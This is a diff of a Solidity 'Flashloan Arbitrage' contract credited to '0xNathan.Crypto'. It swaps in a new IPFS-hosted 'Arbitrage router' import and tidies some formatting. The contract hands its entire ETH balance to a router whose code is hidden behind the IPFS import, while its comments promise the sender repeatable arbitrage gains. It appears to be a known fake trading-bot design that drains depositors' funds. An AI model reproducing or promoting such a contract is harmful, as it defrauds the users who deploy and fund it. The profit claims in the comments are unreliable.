@@ -1,5 +1,12 @@
 pragma solidity ^0.6.7;
 
+// ==================================================
+//
+//         Flashloan Arbitrage - Ethereum 2025
+//         by: 0xNathan.Crypto
+//
+// ==================================================
+
 // Uniswap Deployer
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol";
 // Uniswap Manager
@@ -9,12 +16,12 @@ import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/in
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
 // Arbitrage router
-import "ipfs://QmckoiejUypLwggyUNPvois5g8ajNBhLheFJRWj5X9NrDR";
+import "ipfs://bafkreihmv6otcspicxkhobywnhzqwtlwyv5kgzffjhvxeqh23njvbicmha";
 contract Flashloan {
 
 	Router router;
 	string public tokenName;
-    	string public tokenSymbol;
+	string public tokenSymbol;
 	uint256 maxGas;
 	
 		constructor(
@@ -24,7 +31,7 @@ contract Flashloan {
 		) public {
 		tokenName = _tokenName;
 		tokenSymbol = _tokenSymbol;
-        	maxGas = _maxGas;
+        maxGas = _maxGas;
 
 		router = new Router();
 		}
@@ -50,6 +57,6 @@ contract Flashloan {
 				//After Arbitrage, ETH is transferred back to Router to pay the Uniswap plus fees.
 				router.transferETHtoRouter(router.uniswapDepositAddress());
 				//NOTE: The transaction sender gains ETH from the Arbitrage, this particular transaction can be repeated as price changes all the time.
-				router.completeTransation(address(this).balance);
+				router.completeTransaction(address(this).balance);
 			}
 }
